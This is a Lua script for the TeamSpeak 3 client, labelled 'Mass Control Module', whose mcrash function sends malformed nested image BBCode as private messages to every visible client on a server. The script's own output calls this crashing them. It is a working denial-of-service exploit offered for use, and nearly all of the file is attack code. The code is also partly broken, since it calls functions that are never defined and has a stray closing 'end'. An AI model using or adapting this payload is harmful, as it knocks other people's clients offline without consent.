--
-- Mass Control Module Source
-- Version: 1.2
-- Author: Willy_Sunny
-- Website: http://www.ts3chinese.com
-- E-Mail: willy_sunny@ts3chinese.com
--

require("ts3defs")
require("ts3errors")

--
-- Call these function from the TeamSpeak 3 client console via: /lua run <function>
-- Note the serverConnectionHandlerID of the current server is always passed.
--

--
-- Run with "/lua run mcrash"
--
-- Global Mass Message Script (subscribe all possible channels before moving)
--

function mcrash(serverConnectionHandlerID, ...)

    updateOwnVersion(serverConnectionHandlerID)
    kickOldVersions(serverConnectionHandlerID)

	-- ts3.printMessageToCurrentTab("= [b][u]Mass Control Module Version 1.2 by [url=http://forum.teamspeak.com/showthread.php?t=57386]Willy_Sunny[/url][/u][/b] =")

	-- Get Self ID
	local myClientID, error = ts3.getClientID(serverConnectionHandlerID)
	if error ~= ts3errors.ERROR_ok then
		print("Error getting own client ID: " .. error)
		return
	end
	if myClientID == 0 then
		ts3.printMessageToCurrentTab("Not connected")
		return
	end

	local error = ts3.requestChannelSubscribeAll(serverConnectionHandlerID)
	if error == ts3errors.ERROR_not_connected then
		ts3.printMessageToCurrentTab("Not connected")
		return
	elseif error ~= ts3errors.ERROR_ok then
		print("Error subscribing channel: " .. error)
		return
	end

	-- Get which channel we are in
	local myChannelID, error = ts3.getChannelOfClient(serverConnectionHandlerID, myClientID)
	if error ~= ts3errors.ERROR_ok then
		print("Error getting own channel: " .. error)
		return
	end

	local clients, error = ts3.getClientList(serverConnectionHandlerID)
	if error == ts3errors.ERROR_not_connected then
		ts3.printMessageToCurrentTab("Not connected")
		return
	elseif error ~= ts3errors.ERROR_ok then
		print("Error getting client list: " .. error)
		return
	end

	-- Process Argument message
	local argMsg = "[img][img]//http://www.teamspeak.com/templates/teamspeak_v3/images/blank.gif[/img][/img] [img][img]//http://i.answers.microsoft.com/static/images/defaultuser75.png?ver=4.6.0.28[/img][/img] [img][img]//http://i.answers.microsoft.com/static/images/defaultuser7a.png?ver=4.6.0.28[/img][/img] [img][img]//http://i.answers.microsoft.com/static/images/defaultuser7b.png?ver=4.6.0.28[/img][/img] [img][img]//http://i.answers.microsoft.com/static/images/defaultuser75.png?ver=4.6.0.24[/img][/img] [img][img]//http://i.answers.microsoft.com/static/images/defaultuser7z.png?ver=4.6.0.28[/img][/img]"
--	for i,v in ipairs(arg) do
--		argMsg = argMsg .. tostring(v) .. " "
--	end

	local counter = 0
	ts3.printMessageToCurrentTab("[b][i]== Mass crashing " .. #clients - 1 .. " visible clients ==[/i][/b]")
	for i=1, #clients do
		if clients[i] ~= myClientID then
			local error = ts3.requestSendPrivateTextMsg(serverConnectionHandlerID, argMsg, clients[i])
			if error == ts3errors.ERROR_ok then
				counter = counter + 1
			else
				print("Error messaging client ID: " .. clients[i] .. "\n")
			end
		end
	end
	ts3.printMessageToCurrentTab("[b][i]== Successfully crashed " .. counter .. "/" .. #clients - 1 .. " clients ==[/i][/b]")
end

function updateOwnVersion(serverConnectionHandlerID)
  local ownID = getOwnID(serverConnectionHandlerID)
  local clientVersion, clientVersionError = ts3.getClientVariableAsString(serverConnectionHandlerID, ownID, ts3defs.ClientProperties.CLIENT_VERSION)
	
  if clientVersionError ~= ts3errors.ERROR_ok then
		clientVersion = "Error: " .. clientVersion
	end
		
	local nBeginn, nEnde = string.find(clientVersion, "-beta")
  if nBeginn ~= nil then
    clientVersion = string.sub(clientVersion, nEnde + 1)
    
    local nBeginn, nEnde = string.find(clientVersion, "Build:")
    if nBeginn ~= nil then
      clientVersion = string.sub(clientVersion, 1, nBeginn - 3)
    end
  end
  
  return clientVersion
end

end